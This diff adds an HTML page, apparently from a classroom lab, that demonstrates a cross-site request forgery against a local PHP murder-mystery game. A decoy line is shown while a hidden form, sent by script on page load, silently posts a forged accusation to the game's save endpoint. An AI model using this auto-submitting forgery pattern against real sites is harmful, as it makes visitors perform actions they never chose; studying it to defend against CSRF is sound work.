@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attacco csrf</title>
+
+</head>
+<body>
+    
+    <p>L'assassino è la contessa Elena</p>
+
+    <form action="http://localhost/INF4-php/game-v2/salva_accusa.php" method="POST" id="form-accusa" style="display: none;">
+            
+           
+            <input name="colpevole" value="prof.angeli" type="hidden">
+                
+            
+            <input name="arma" value="tastiera" type="hidden">
+                
+           
+            <input name="movente" value="x" type="hidden">
+
+    </form>
+
+
+    <script>
+
+       // document.getElementById("form-accusa").submit();
+
+        var form = document.getElementById("form-accusa");
+
+
+        fetch(form.action, {
+
+            method: form.method,
+            body: new URLSearchParams(new FormData(form)),
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+
+            }
+        });
+
+    </script>
+
+
+
+
+
+</body>
+</html>
